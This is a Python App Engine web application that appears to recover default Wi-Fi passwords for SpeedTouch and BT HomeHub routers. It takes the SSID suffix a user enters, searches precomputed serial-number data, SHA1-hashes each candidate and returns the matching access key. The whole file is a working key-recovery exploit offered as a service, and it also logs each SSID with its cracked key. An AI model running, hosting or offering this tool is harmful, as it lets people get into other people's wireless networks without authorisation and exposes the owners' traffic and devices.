#!/usr/bin/env python
#
# Copyright 2007 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

import hashlib
import sys
import binascii
import re
import logging

import wsgiref.handlers
from google.appengine.ext import webapp
from google.appengine.ext.webapp import util
from google.appengine.ext.webapp import template



class MainHandler(webapp.RequestHandler):
	def get(self):
		template_values = {
			'result': "",
			'input': ""
		}
		self.response.out.write(template.render('template.html', template_values))
	def post(self):
		
		result = doCrack(self.request.get('ssid'))
		
		template_values = {
			'result': result,
			'input': self.request.get('ssid')
		}
		self.response.out.write(template.render('template.html', template_values))

def doCrack(ssidinput):
	if len(ssidinput) < 2:
	  return "Enter something..."
	SSIDEND = ssidinput.upper()
	#sys.argv[1].decode("hex")

	if len(SSIDEND) == 6:
	  #SpeedTouch:
	  FINDPOS = 0  
	elif len(SSIDEND) == 4:
	  #BT HomeHub:
	  FINDPOS = 1
	else:
	  return "Invalid SSID	"

	YEARS = [ 2010, 2009, 2008, 2007, 2006, 2005, 2004 ]
	#YEARS = [ 2009, 2008, 2007, 2006, 2005, 2004, 2010 ]
	#YEAR = sys.argv[2].lower()

	def ascii2hex(char):
	  return hex(ord(char))[2:].upper()

	CHARSET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
	try:
		BINCODE = binascii.unhexlify("".join(SSIDEND.split()))
	except TypeError:
		return "Invalid SSID"

	for YEAR in YEARS:
	  FILE = "data/touchspeedcalc_" + str(YEAR) + ".dat"
	  INFILE = open(FILE,"rb")
	  FILEDATA = INFILE.read()
	  INFILE.close()
	  WHEREFOUND = FILEDATA.find(BINCODE, 0)
	  while (WHEREFOUND > -1):
	    if WHEREFOUND % 3 == FINDPOS:
	      PRODIDNUM = (WHEREFOUND / 3) % (36*36*36)
	      PRODWEEK = (WHEREFOUND / 3) / (36*36*36) +1
	      PRODID1 = PRODIDNUM / (36*36)
	      PRODID2 = (PRODIDNUM / 36) % 36
	      PRODID3 = PRODIDNUM % 36
	      SERIAL = 'CP%02d%02d%s%s%s' % (YEAR-2000,PRODWEEK,ascii2hex(CHARSET[PRODID1:PRODID1+1]),ascii2hex(CHARSET[PRODID2:PRODID2+1]),ascii2hex(CHARSET[PRODID3:PRODID3+1]))
	      SHA1SUM = hashlib.sha1(SERIAL).digest().encode("hex").upper()
	      SSID = SHA1SUM[-6:]
	      ACCESSKEY = SHA1SUM[0:10]
	      if len(SSIDEND) == 4:
	        # BT HomeHub password is lowercase:
	        ACCESSKEY = ACCESSKEY.lower()
	      logging.info(ssidinput+" "+ACCESSKEY)
	      return "<h1>"+ACCESSKEY+"</h1>"

	    WHEREFOUND = FILEDATA.find(BINCODE, WHEREFOUND+1)


def main():
    application = webapp.WSGIApplication([('/', MainHandler)],
                                         debug=True)
    util.run_wsgi_app(application)


if __name__ == '__main__':
    main()
